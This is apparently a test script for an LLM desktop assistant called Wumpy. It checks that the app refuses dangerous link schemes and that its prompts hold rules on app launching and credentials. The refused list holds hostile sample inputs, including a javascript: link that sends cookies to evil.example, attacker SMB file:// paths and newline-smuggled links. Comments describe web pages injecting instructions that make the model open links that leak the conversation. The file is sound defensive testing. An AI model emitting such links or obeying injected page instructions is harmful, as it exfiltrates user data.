/**
 * Checks what Wumpy will and will not hand to the operating system.
 *
 * `shell.openExternal` is not "show a web page". On Windows the string goes to
 * the shell, which launches whatever program has registered that scheme - so a
 * link is a way to start an application, and `file://` is a way to reach a local
 * file or a remote SMB share. The model writes links, and this app feeds the
 * model web pages, so a link in an answer may be one a page asked for rather
 * than one it chose.
 *
 * Which makes the refusals the important half of this file. Everything in the
 * "refused" section would otherwise be a way to run something.
 *
 * Run with: npm run check:links
 */
import { build } from 'esbuild'
import { readFileSync, rmSync } from 'node:fs'
import { join } from 'node:path'
import { pathToFileURL } from 'node:url'

const out = join(process.cwd(), '.links-check.mjs')
await build({
  entryPoints: ['src/shared/links.ts'],
  bundle: true,
  platform: 'node',
  format: 'esm',
  outfile: out,
  logLevel: 'error'
})
const L = await import(pathToFileURL(out).href)
rmSync(out, { force: true })

let failed = 0
const pad = (s, n) => String(s).padEnd(n)
const check = (what, got, want) => {
  const ok = got === want
  if (!ok) failed++
  console.log(`${ok ? 'ok  ' : 'FAIL'} ${pad(what, 52)} ${JSON.stringify(got)}`)
  if (!ok) console.log(`${' '.repeat(5)}${pad('', 52)} expected ${JSON.stringify(want)}`)
}

/* ------------------------------------------------------------------ refused */

/**
 * Every one of these is a way to start a program or read a file, not a way to
 * open a web page. They are refused outright rather than offered with a warning,
 * because there is no legitimate version of them for this app to permit.
 */
const REFUSED = [
  'file:///C:/Windows/System32/calc.exe',
  'file://attacker.example/share/payload',
  'javascript:fetch("https://evil.example/"+document.cookie)',
  'data:text/html,<script>alert(1)</script>',
  'vbscript:msgbox(1)',
  'ms-settings:privacy-microphone',
  'search-ms:query=password',
  'steam://run/570',
  'slack://channel?id=C123',
  'shell:startup',
  'about:blank',
  'chrome://settings',
  'mailto:someone@example.com',
  'tel:+15551234',
  'ftp://files.example.com/x',
  'ws://localhost:9229',
  'intent://scan/#Intent;scheme=zxing;end',
  'jar:http://example.com/x.jar!/',
  'view-source:https://example.com'
]
for (const link of REFUSED) {
  const v = L.checkLink(link)
  check(`refused: ${link.slice(0, 42)}`, v.ok, false)
}

// A refusal has to say why, or it reads as a bug.
check('a refusal explains itself', Boolean(L.checkLink('steam://run/570').why), true)
check('file:// is named specifically', /file:\/\//.test(L.checkLink('file:///C:/x').why), true)

/* -------------------------------------------------------------- disguises */

check('credentials in the host', L.checkLink('https://www.google.com@evil.example/').ok, false)
check('a password too', L.checkLink('https://user:pw@evil.example/').ok, false)
check(
  'a newline hiding a second link',
  L.checkLink('https://good.example\njavascript:alert(1)').ok,
  false
)
check('a tab', L.checkLink('https://good.example\tx').ok, false)
check('nothing at all', L.checkLink('   ').ok, false)
check('not a link', L.checkLink('what is the capital of France').ok, false)
check('a Windows path', L.checkLink('C:\\Users\\zecha\\secrets.txt').ok, false)
check('a UNC path', L.checkLink('\\\\attacker\\share').ok, false)

/**
 * A homograph is allowed through - it is a real https site - but the card must
 * show what a browser would resolve, not what the text looked like.
 */
const homograph = L.checkLink('https://аpple.com/id')
check('a homograph is shown punycoded', homograph.host, 'xn--pple-43d.com')

/* ------------------------------------------------------------------ allowed */

check('a plain https link', L.checkLink('https://example.com/a/b?c=d').ok, true)
check('http as well', L.checkLink('http://example.com').ok, true)
check('a bare host gets https', L.checkLink('youtube.com').url, 'https://youtube.com/')
check(
  'a bare host with a path',
  L.checkLink('github.com/psyduck-z').url,
  'https://github.com/psyduck-z'
)
check('the host is reported', L.checkLink('https://www.bbc.co.uk/news').host, 'www.bbc.co.uk')

/* -------------------------------------------------------- local destinations */

for (const [link, local] of [
  ['http://localhost:3000', true],
  ['http://127.0.0.1:8080/admin', true],
  ['http://192.168.1.1/', true],
  ['http://10.0.0.5/', true],
  ['http://172.20.1.1/', true],
  ['http://169.254.169.254/latest/meta-data/', true],
  ['http://printer.local/', true],
  ['https://example.com/', false],
  ['https://172.32.0.1/', false]
]) {
  const v = L.checkLink(link)
  check(`local: ${link}`, v.local, local)
}

/* ------------------------------------------------- telling the two apart */

check('a url is a url', L.looksLikeUrl('example.com/x'), true)
check('a phrase is not', L.looksLikeUrl('best pizza near me'), false)
check('one word is not a host', L.looksLikeUrl('youtube'), false)
check('a path is not a url', L.looksLikeUrl('C:\\Users'), false)

/* ---------------------------------------------------------------- searching */

check(
  'a query is encoded, not interpolated',
  L.searchUrl('rust & c++ #1 "best"'),
  'https://duckduckgo.com/?q=rust%20%26%20c%2B%2B%20%231%20%22best%22'
)
check(
  'the engine can change',
  L.searchUrl('cats', 'google').startsWith('https://www.google.com/search?q='),
  true
)
check(
  'every engine is https',
  Object.values(L.SEARCH_ENGINES).every((e) => e.url.startsWith('https://')),
  true
)
check('a built search is always allowed', L.checkLink(L.searchUrl('anything at all')).ok, true)

/* ------------------------------------------------- opening without a click */

const site = L.checkLink('https://example.com/')
const local = L.checkLink('http://localhost:3000/')
const bad = L.checkLink('file:///C:/x')

check('manual: a search still asks', L.linkOpensItself(site, 'search', 'manual'), false)
check('manual: a model link asks', L.linkOpensItself(site, 'model', 'manual'), false)

/**
 * The central judgement. In auto mode a search opens itself, because this app
 * built the URL and the destination is a search engine whatever the query says.
 * A URL the model chose does not, because the model reads web pages and a page
 * can tell it to open a link with the conversation in the query string.
 */
check('auto: a search opens itself', L.linkOpensItself(site, 'search', 'auto'), true)
check('auto: a model link waits for a click', L.linkOpensItself(site, 'model', 'auto'), false)
check('accept-all: a model link opens', L.linkOpensItself(site, 'model', 'all'), true)

check('a local address never opens itself', L.linkOpensItself(local, 'search', 'all'), false)
check('and a refused link certainly does not', L.linkOpensItself(bad, 'search', 'all'), false)

/* ------------------------------------------------- reading the model's block */

const r1 = L.readLinkRequest('# Look up the release notes\nsearch: Electron 44 release notes')
check('a search request', r1.query, 'Electron 44 release notes')
check('with its reason', r1.reason, 'Look up the release notes')
check('and no target', r1.target, null)

const r2 = L.readLinkRequest('# Open the repository\nhttps://github.com/psyduck-z/Wumpy')
check('a url request', r2.target, 'https://github.com/psyduck-z/Wumpy')
check('its reason', r2.reason, 'Open the repository')

check(
  'an autolink is unwrapped',
  L.readLinkRequest('<https://example.com/>').target,
  'https://example.com/'
)
check(
  'a markdown link is unwrapped',
  L.readLinkRequest('[docs](https://example.com/d)').target,
  'https://example.com/d'
)
check(
  'trailing punctuation goes',
  L.readLinkRequest('https://example.com/a.').target,
  'https://example.com/a'
)
check('a comment-only block asks for nothing', L.readLinkRequest('# just thinking').target, null)

/* ----------------------------------------------- nothing bypasses the check */

/**
 * There is one function that decides this, and everything that can reach the
 * shell has to go through it - including the window-open handler, which predates
 * the feature and used to pass whatever a link in an answer contained.
 */
const main = readFileSync('src/main/browser.ts', 'utf8')
check('the opener checks the link itself', /checkLink\(/.test(main), true)
check('and refuses rather than trusting the caller', /if \(!check\.ok\)/.test(main), true)

const panel = readFileSync('src/main/panel.ts', 'utf8')
const handler = panel.slice(
  panel.indexOf('setWindowOpenHandler'),
  panel.indexOf('ELECTRON_RENDERER_URL')
)
check('links clicked in an answer are checked too', /openLink/.test(handler), true)
check('nothing calls openExternal directly', /openExternal/.test(panel), false)

const all = ['src/main/index.ts', 'src/main/panel.ts', 'src/main/browser.ts']
  .map((f) => readFileSync(f, 'utf8'))
  .join('\n')
check(
  'openExternal is reached from exactly one place',
  // With the paren, so the mention of it in browser.ts's own comment does not count.
  (all.match(/shell\.openExternal\(/g) ?? []).length,
  1
)

/* ------------------------------- a link with something else on the line */

// Seen in use: the model put the address and some stray words on one line and
// the card said "That is not a link" with the link plainly visible on it.
// Refusing there is the worst outcome - a proposal the user can see is right
// and cannot act on.
check(
  'a link with trailing junk is still a link',
  L.readLinkRequest('# Open Google\nhttps://www.google.com float: right').target,
  'https://www.google.com'
)
check(
  'and with words in front of it',
  L.readLinkRequest('# Open it\nGo to https://example.com/x now').target,
  'https://example.com/x'
)
check(
  'the first link wins when there are two',
  L.readLinkRequest('https://a.example/1 or https://b.example/2').target,
  'https://a.example/1'
)
// A bare word with a dot is as likely to be the end of a sentence as a host,
// so only an explicit scheme is dug out of a multi-word line.
check(
  'prose with no scheme is not mined for a host',
  L.readLinkRequest('# hmm\nmaybe google.com would work').target,
  'maybe google.com would work'
)
check('which checkLink then refuses', L.checkLink('maybe google.com would work').ok, false)
check(
  'a lone bare host still works',
  L.readLinkRequest('# Open it\nexample.com').target,
  'example.com'
)

/* ------------------------------------ a search that is really an address */

// Measured on llama3.2:3b asked to open google.com: `search:
// https://www.google.com` twice in three. Taken literally that searches for
// the address instead of going there.
check(
  'a search for a URL is treated as the URL',
  L.readLinkRequest('# Open Google\nsearch: https://www.google.com').target,
  'https://www.google.com'
)
check(
  'and is not left as a query',
  L.readLinkRequest('# Open Google\nsearch: https://www.google.com').query,
  null
)
check(
  'a bare host in a search counts too',
  L.readLinkRequest('search: google.com').target,
  'google.com'
)
check(
  'but real words stay a search',
  L.readLinkRequest('search: how do i open google').query,
  'how do i open google'
)
check(
  'and that search has no target',
  L.readLinkRequest('search: how do i open google').target,
  null
)
check(
  'a search for one word stays a search',
  L.readLinkRequest('search: electron').query,
  'electron'
)

/* --------------------------------- opening an app is not opening a site */

// "Open Spotify" means the app if it is installed and the website if it is
// not, and nothing here can tell which without looking. The model used to
// pick one silently, so the user had no way to know whether it had checked.
//
// Measured on gemini-3.1-flash-lite after adding this: 4/4 asked for a check
// when given an app name and went straight to the page for github.com, and
// 3/3 branched correctly on the result - including treating
// "DolbyDigitalPlusDecoder" as not a match for "git".
const tiersOut = join(process.cwd(), '.links-tiers.mjs')
await build({
  entryPoints: ['src/shared/assistant.ts'],
  bundle: true,
  platform: 'node',
  format: 'esm',
  outfile: tiersOut,
  logLevel: 'error'
})
const T = await import(pathToFileURL(tiersOut).href)
rmSync(tiersOut, { force: true })

check(
  'the prompt separates an app from a website',
  T.OPEN_PROMPT.includes('OPENING AN APP IS NOT THE SAME'),
  true
)
/**
 * The installed-check, after it got Spotify wrong on this machine.
 *
 * It led with Get-AppxPackage, which only sees Store packages. Measured here,
 * against a Spotify that is installed and sitting in the Start menu:
 *
 *   Get-AppxPackage *Spotify*   empty
 *   Get-StartApps               found
 *   HKCU uninstall              found
 *   HKLM uninstall              empty
 *   all three hives             found
 *
 * So the first thing the model was told to run finds nothing for a normal
 * desktop install, and HKLM alone finds nothing either. Both are now fixed in
 * the prompt, and asserted here so the ordering does not drift back.
 */
check('it leads with Get-StartApps', T.OPEN_PROMPT.includes('Get-StartApps'), true)
check(
  'and says not to lead with Get-AppxPackage',
  T.OPEN_PROMPT.includes('Do NOT lead with Get-AppxPackage'),
  true
)
check(
  'because that misses a desktop install',
  T.OPEN_PROMPT.includes('returns nothing while Spotify is installed'),
  true
)
check('and for desktop installs', T.OPEN_PROMPT.includes('Uninstall'), true)
// HKLM alone came back empty for Spotify, so all three hives are named.
check('it searches HKCU too', T.OPEN_PROMPT.includes('HKCU:'), true)
check('and the WOW6432Node hive', T.OPEN_PROMPT.includes('WOW6432Node'), true)
check(
  'and tolerates keys it cannot read',
  T.OPEN_PROMPT.includes('-ErrorAction SilentlyContinue'),
  true
)
check('part of a word is called out as not a match', T.OPEN_PROMPT.includes('is not a match'), true)

/**
 * The inference that produced the wrong answer, forbidden by name.
 *
 * The model proposed a check, the check errored, and it reported "This means
 * that Spotify is not installed on this machine" - then answered "I am
 * certain" when asked. A command that did not run says nothing about the
 * question, and that is now stated as its own rule rather than left implicit
 * in "an empty result, a non-zero exit and an error are three different
 * things", which was already there and did not hold.
 */
check(
  'empty output means absent, not failed',
  T.OPEN_PROMPT.includes('Empty output and a failed command are NOT the same answer'),
  true
)
check(
  'and a failed check is never a negative result',
  T.VOICE_PROMPT.includes('A BROKEN COMMAND IS NOT A NEGATIVE RESULT'),
  true
)
check('the worst inference is named as such', /single worst inference/.test(T.VOICE_PROMPT), true)
check(
  '"are you sure" means re-read, not re-assert',
  T.VOICE_PROMPT.includes('Never answer "I am certain" from memory'),
  true
)
check('installed means launch it', T.OPEN_PROMPT.includes('Start-Process'), true)

/**
 * Trying is allowed. Typing a password is not.
 *
 * Wumpy refused to sign in to Spotify, and that refusal was one step too
 * early: "sign me in" almost always means "open it, I am already signed in",
 * and the session lives in the browser rather than in anything the model has
 * to supply. Refusing the whole request to avoid a credential prompt it had
 * not reached yet is the restriction being wrong in the direction nobody
 * notices - the user just gets less help.
 *
 * The line is where it always was, only now it is drawn in the right place:
 * open the thing, and stop at the screen that wants a username, a password, a
 * code or a card.
 */
check('it is told to try rather than refuse', T.OPEN_PROMPT.includes('TRY IT'), true)
check(
  'and to take "my credentials are saved" at face value',
  T.OPEN_PROMPT.includes('take them at their word and try'),
  true
)
check('not to lecture about it', T.OPEN_PROMPT.includes('do not lecture'), true)
check(
  'there is exactly one place to stop',
  T.OPEN_PROMPT.includes('exactly one place to stop'),
  true
)
check('and it is named precisely', T.OPEN_PROMPT.includes('one-time code or a card'), true)
check(
  'it may never invent a credential',
  T.OPEN_PROMPT.includes('never type, guess or invent'),
  true
)
// Stopping is an answer, not a failure - the previous refusal read as one.
check('stopping reads as a finished answer', T.OPEN_PROMPT.includes('finished answer'), true)
// The transcript is saved to disk and commands are logged, so a password the
// user types at it must not be echoed into either.
check(
  'a password the user supplies is not echoed back',
  T.OPEN_PROMPT.includes('do not repeat it back'),
  true
)
check('nor put in a command', T.OPEN_PROMPT.includes('never'), true)
check(
  'not installed means the website',
  T.OPEN_PROMPT.includes('Not installed -> open the website'),
  true
)
check(
  'and the user is told which happened',
  T.OPEN_PROMPT.includes('say which you did and why'),
  true
)
// Canonical cmdlet names, not aliases: clearer to read, and the thing the
// read-only allowlist parses most reliably.
check('the check avoids the Select alias', T.OPEN_PROMPT.includes('| Select '), false)

/* ----------------------------------- searching on a site, not about it */

// Reported: "Open YouTube and search up the deadliest self-defense move"
// opened DuckDuckGo for "deadliest self defense move youtube" - a results
// page about YouTube rather than a search inside it. `search:` always goes to
// the user's own engine, and nothing told the model that naming a site means
// using that site's own search.
//
// Measured on gemini-3.1-flash-lite after adding this: YouTube, Wikipedia and
// GitHub all went to the right place, and "google the weather in sydney" used
// wumpy-search to fetch an answer rather than opening a tab, which is better
// than what was asked for.
check(
  'a site search is separated from a web search',
  T.OPEN_PROMPT.includes('SEARCHING *ON* A SITE IS NOT A WEB SEARCH'),
  true
)
check(
  "YouTube's own search URL is given",
  T.OPEN_PROMPT.includes('youtube.com/results?search_query='),
  true
)
check(
  'along with several more',
  ['wikipedia.org', 'github.com/search', 'reddit.com/search', 'amazon.com/s?k='].every((u) =>
    T.OPEN_PROMPT.includes(u)
  ),
  true
)
// "deadliest self defense move youtube" is asking YouTube about YouTube.
check(
  'the site name is dropped from the query',
  T.OPEN_PROMPT.includes('asking YouTube about YouTube'),
  true
)
check('and the query is encoded', T.OPEN_PROMPT.includes('percent-encoded'), true)
check(
  'search: is still right with no site named',
  T.OPEN_PROMPT.includes('Use `search:` when no site was named'),
  true
)

/* ------------------------------------------------- acting exactly once */

// Observed: one proposal, two "Opened duckduckgo.com in your browser." A ref
// guarding the action dies with the component, so anything that remounts a
// card lets it act again - a page in two tabs, a file written twice, a search
// charged twice to a quota.
const once = readFileSync('src/renderer/src/once.ts', 'utf8')
check('claims are kept outside React', once.includes('const claimed = new Set<string>()'), true)
check('and keyed per message and target', once.includes('per message and per target'), true)
for (const card of ['LinkCard', 'WriteCard', 'SearchCard']) {
  const src = readFileSync(`src/renderer/src/components/${card}.tsx`, 'utf8')
  check(`${card} claims before it acts`, src.includes('claimOnce('), true)
}
const appSrc = readFileSync('src/renderer/src/App.tsx', 'utf8')
check('a new chat forgets them', /newChat[\s\S]{0,400}forgetClaims\(\)/.test(appSrc), true)
// Otherwise a reopened chat finds its own proposals already claimed.
check(
  'reopening one forgets them too',
  /chat\.replace\(loaded\.messages\)[\s\S]{0,300}forgetClaims\(\)/.test(appSrc),
  true
)

console.log(`\n${failed === 0 ? 'all' : `${failed} FAILED of`} link checks`)
process.exit(failed === 0 ? 0 : 1)
